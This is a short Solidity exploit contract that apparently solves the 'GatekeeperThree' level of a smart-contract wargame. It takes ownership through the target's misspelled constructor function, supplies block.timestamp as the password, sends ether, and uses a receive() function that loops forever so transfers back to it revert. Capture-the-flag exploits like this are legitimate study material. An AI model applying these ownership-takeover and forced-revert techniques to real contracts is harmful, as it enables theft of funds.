// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Level.sol";
 
contract Attacker{
    GatekeeperThree target;
    constructor(address _target) payable {
       require(msg.value > 0.001 ether);
       target = GatekeeperThree(_target);
    }

    function attack() external {
        target.construct0r();
        target.createTrick();
        target.getAllowance(block.timestamp);
        address(target).send(address(this).balance);
        target.enter();
    }



    receive() external payable {
        //an infinite loop for fun - idea is to rever the call
        for(uint i=1; i < 2**256-1; i++) {
            i--;
        }
    }

}